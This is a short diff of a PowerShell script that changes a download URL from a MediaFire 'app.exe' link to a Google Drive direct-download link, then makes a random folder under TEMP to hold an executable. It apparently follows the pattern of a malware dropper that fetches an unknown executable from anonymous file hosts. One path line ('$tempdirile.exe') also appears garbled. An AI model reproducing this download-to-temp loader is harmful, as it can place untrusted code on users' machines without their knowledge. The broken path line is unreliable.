@@ -1,5 +1,5 @@
 & {
-    $url = "https://www.mediafire.com/file/hyxklk7j5zgjlkn/app.exe/file"
+    $url = "https://drive.usercontent.google.com/u/0/uc?id=1IxYhViN79H065b_BJnAiA-Wxf14w9FoK&export=download"
     $tempdir = "$env:TEMP\$(New-Guid)"
     mkdir $tempdir | Out-Null
     $file = "$tempdirile.exe"
